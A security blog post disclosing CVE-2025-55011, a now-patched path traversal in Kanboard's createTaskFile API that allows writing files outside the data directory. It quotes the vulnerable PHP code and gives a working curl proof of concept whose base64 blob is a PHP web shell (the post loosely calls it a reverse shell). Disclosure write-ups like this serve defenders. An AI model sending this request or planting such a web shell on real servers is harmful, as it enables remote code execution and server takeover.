---
layout: post
title: "Kanboard CVE-2025-55011"
category: cve
tags: [kanboard, cve-2025-55011, security]
---

<style>
pre {
  margin-top: 1.5em;   /* space above */
  margin-bottom: 1.5em !important; /* space below */
}
</style>

## Path Traversal in Task File Upload API Leads To Arbitrary File Write
### Identifying the Vulnerability
File upload vulnerabilities are often a great way to exploit an app. A couple clicks of a button and... BOOM! The server is now yours.  That's why I always make it a priority to check how files are sanitized when uploaded to an app.

When examining Kanboard's file-related protections, I noticed that a lot of work had been done on `read` protecting key files from path traversal, particularly by this method in `FileStorage.php`.

```php
/**
 * Fetch object contents
 *
 * @access public
 * @throws ObjectStorageException
 * @param  string  $key
 * @return string
 */
public function get($key)
{
    return file_get_contents($this->getRealFilePath($key));
}


private function getRealFilePath($key)
{
    $realFilePath = realpath($this->baseDir.DIRECTORY_SEPARATOR.$key);

    if ($realFilePath === false) {
        throw new ObjectStorageException('Invalid path: '.$key);
    }

    if (strpos($realFilePath, $this->baseDir) !== 0) {
        throw new ObjectStorageException('File is not in base directory: '.$realFilePath);
    }

    if (! file_exists($realFilePath)) {
        throw new ObjectStorageException('File not found: '.$realFilePath);
    }

    return $realFilePath;
}
```

However, I soon notice that on the `write` side of things (aka file upload), similar restrictions were not in place.

```php
/**
 * Save object
 *
 * @access public
 * @throws ObjectStorageException
 * @param  string  $key
 * @param  string  $blob
 */
public function put($key, &$blob)
{
    $this->createFolder($key);

    if (file_put_contents($this->baseDir.DIRECTORY_SEPARATOR.$key, $blob) === false) {
        throw new ObjectStorageException('Unable to write the file: '.$this->baseDir.DIRECTORY_SEPARATOR.$key);
    }
}
```

With this in mind, I decided to see if there were any places within the app where path traversal would be possible when writing a file. I then came across the following in `TaskFileProcedure.php`. 

```php
 public function createTaskFile($project_id, $task_id, $filename, $blob) 
 { 
     ProjectAuthorization::getInstance($this->container)->check($this->getClassName(), 'createTaskFile', $project_id); 
  
     try { 
         return $this->taskFileModel->uploadContent($task_id, $filename, $blob); 
     } catch (ObjectStorageException $e) { 
         $this->logger->error(__METHOD__.': '.$e->getMessage()); 
         return false; 
     } 
 } 
```
As can be seen, the method takes in a `project_id`, `task_id`, `filename`, and a `blob`. Note that the `project_id` appears to be validated in the first line, but the other params are not.

Going further down the method chain into `FileModel.php`, we can see how the file path is generated for a file about to be written.

```
/**
 * Generate the path for a new filename
 *
 * @access public
 * @param  integer   $id            Foreign key
 * @param  string    $filename      Filename
 * @return string
 */
public function generatePath($id, $filename)
{
    return $this->getPathPrefix().DIRECTORY_SEPARATOR.$id.DIRECTORY_SEPARATOR.hash('sha1', $filename.time());
}
```

Note that we cannot influence the final file name, as the file name we supply will be `SHA-1` hashed with the current timestamp.  However, we do control the `id` field via `task_id`, and from what we saw before, this means that we have full control over the directory we want to place the file in! All we have to do is use a payload like:

```
"project_id": 1,
"task_id": "../../../plugins",
"filename": "shell.php",
"blob": "PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7ID8+"
```

Since the app by default blocks execution of all files in the `/data` directory, we can use this path traversal to our advantage and escape the data directory to hopefully trigger execution.

### Exploiting

Assuming the base installation of Kanboard via docker, the following folders will be writable. Fortunately with the default container settings these are relatively low-risk.

```
/run/nginx
/var/lib/nginx
/var/lib/nginx/tmp
/var/lib/nginx/tmp/fastcgi
/var/lib/nginx/tmp/client_body
/var/lib/nginx/tmp/uwsgi
/var/lib/nginx/tmp/scgi
/var/lib/nginx/tmp/proxy
/var/log/nginx
/var/www/app/plugins
/var/www/app/data
/var/www/app/data/cache
/var/www/app/data/files
/var/www/app/data/files/tasks
/var/www/app/data/files/tasks/1
/proc/acpi
/proc/asound
/tmp
/dev/mqueue
/dev/shm
/var/tmp
/sys/firmware
```

However on a manual installation outside of the docker setup, this exploit could be much riskier. If a user denies all execution in the data directory but allows it from anywhere else, an attacker could write a reverse shell to plugins and immediately gain remote code execution and greatly increase the severity.

### PoC
Running Kanboard 1.2.46 inside docker on locahost:3000.

1. After creating a project, make the following curl requst:

    ```
    curl -X POST http://localhost:3000/jsonrpc.php \
    -u admin:admin \
    -H "Content-Type: application/json" \
    -d '{
    "jsonrpc": "2.0",
    "method": "createTaskFile",
    "id": 1,
    "params": {
      "project_id": 1,
      "task_id": "../../../plugins",
      "filename": "shell.php",
      "blob": "PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7ID8+"
    }
    }'
    ```
2. In the docker container notice that a file has been created in the /plugins directory with a php reverse shell as it's contents (fortunately it's not executable in the docker setup, but could be on user installations).

    <figure style="text-align: center; margin: 2em 0;">
      <img src="/assets/img/kanboard/file_created.png" alt="Password Reset" style="display: block; margin-left: auto; margin-right: auto; max-width: 90%; border-radius: 8px;">
    </figure>


### Final Thoughts
Developers are always paranoid about arbitrary file read, but often times file write can be just as deadly. What's more, even if obvious parameters like `filename` are sanitized, if other parameters are used in the path (like `task_id`) path traversal can still be possible.

Note that this has been patched and a security advisory has been published here: [GHSA-26f4-rx96-xc55 advisory](https://github.com/kanboard/kanboard/security/advisories/GHSA-26f4-rx96-xc55)
 
